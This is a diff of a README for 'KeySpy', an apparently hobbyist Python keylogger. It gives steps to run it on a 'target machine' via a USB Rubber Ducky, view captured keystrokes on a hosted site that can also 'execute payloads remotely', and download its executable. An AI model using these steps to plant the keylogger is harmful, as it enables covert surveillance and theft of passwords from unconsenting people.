@@ -45,7 +45,7 @@ KeySpy is a Python keylogger with a web interface for viewing captured keystroke
 ## Usage
    ### 🦆Rubber Ducky
    - Download the DuckyScript.txt and load that in USB Rubber Ducky.
-   - Connect the USB Rubber Ducky to the target machine at least 30 seconds.
+   - Connect the USB Rubber Ducky to the target machine.
    - It will run KeySpy on that machine.
      
    <!--### 🕸️Web Extension:
@@ -58,12 +58,12 @@ KeySpy is a Python keylogger with a web interface for viewing captured keystroke
    ### 🌐Web Interface:
    - Visit this site [w3blogger.vercel.app](https://w3blogger.vercel.app/) to monitor the keylogs and execute payloads remotely
    
-
 ## Note
 - For Downloading the `kSpy-AIO.exe` file [click here](https://github.com/3rr0r-505/KeySpy/releases/download/v1.4.1/kSpy-AIO_v1.4.exe) or visit the releases page.
 <!--
 - Create a `mongoDB Atlas` cluster and use the connection links. 
 - Soon the extension will be available on the chrome store.-->
+ `⚠️ It's a Experimental project inspired by Hak5 OMG & still in development. If you have any queries feel free to DM me on discord.`
 
 ## Contributing
 
